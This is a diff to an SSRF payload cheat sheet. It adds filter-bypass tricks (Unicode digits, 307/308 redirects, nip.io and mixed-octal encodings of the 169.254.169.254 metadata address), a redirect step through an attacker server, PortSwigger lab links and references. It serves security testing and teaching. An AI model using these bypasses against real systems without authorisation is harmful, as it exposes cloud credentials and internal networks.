@@ -223,6 +223,12 @@ List:
 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
 ```
 
+### Bypass using unicode
+
+In some languages (.NET, Python 3) regex supports unicode by default.
+`\d` includes `0123456789` but also `๐๑๒๓๔๕๖๗๘๙`.
+
+
 ### Bypass filter_var() php function
 
 ```powershell
@@ -249,6 +255,7 @@ http://127.1.1.1:80#\@127.2.2.2:80/
 1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1)
 2. Launch the SSRF pointing to  vulnerable.com/index.php?url=http://YOUR_SERVER_IP
 vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
+3. You can use response codes [307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307) and [308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308) in order to retain HTTP method and body after the redirection.
 ```
 
 ### Bypassing using type=url
@@ -552,9 +559,7 @@ DNS record
 ```powershell
 http://instance-data
 http://169.254.169.254
-http://169.254.169.254.xip.io/
-http://1ynrnhl.xip.io/
-http://www.owasp.org.1ynrnhl.xip.io/
+http://169.254.169.254.nip.io/
 ```
 
 HTTP redirect
@@ -575,6 +580,7 @@ http://0xA9FEA9FE/ Dotless hexadecimal
 http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
 http://0251.0376.0251.0376/ Dotted octal
 http://0251.00376.000251.0000376/ Dotted octal with padding
+http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
 ```
 
 More urls to include
@@ -823,6 +829,14 @@ curl http://rancher-metadata/<version>/<path>
 
 More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/
 
+## Labs
+
+* [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
+* [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
+* [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
+* [SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
+* [SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
+
 
 ## References
 
@@ -850,7 +864,7 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [Hacker101 SSRF](https://www.youtube.com/watch?v=66ni2BTIjS8)
 - [SSRF脆弱性を利用したGCE/GKEインスタンスへの攻撃例](https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/)
 - [SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1 - SaN ThosH - 10 Jan 2019](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978)
-- [SSRF Protocol Smuggling in Plaintext Credential Handlers : LDAP - @0xrst](https://www.silentrobots.com/blog/2019/02/06/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/)
+- [SSRF Protocol Smuggling in Plaintext Credential Handlers : LDAP - @0xrst](https://www.silentrobots.com/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/)
 - [X-CTF Finals 2016 - John Slick (Web 25) - YEO QUAN YANG @quanyang](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
 - [Exploiting SSRF in AWS Elastic Beanstalk - February 1, 2019 - @notsosecure](https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/)
 - [PortSwigger - Web Security Academy Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
@@ -858,3 +872,4 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [SSRF’s up! Real World Server-Side Request Forgery (SSRF) - shorebreaksecurity - 2019](https://www.shorebreaksecurity.com/blog/ssrfs-up-real-world-server-side-request-forgery-ssrf/)
 - [challenge 1: COME OUT, COME OUT, WHEREVER YOU ARE!](https://www.kieranclaessens.be/cscbe-web-2018.html)
 - [Attacking Url's in JAVA](https://blog.pwnl0rd.me/post/lfi-netdoc-file-java/)
+- [SSRF: Don't encode entire IP](https://twitter.com/thedawgyg/status/1224547692967342080)
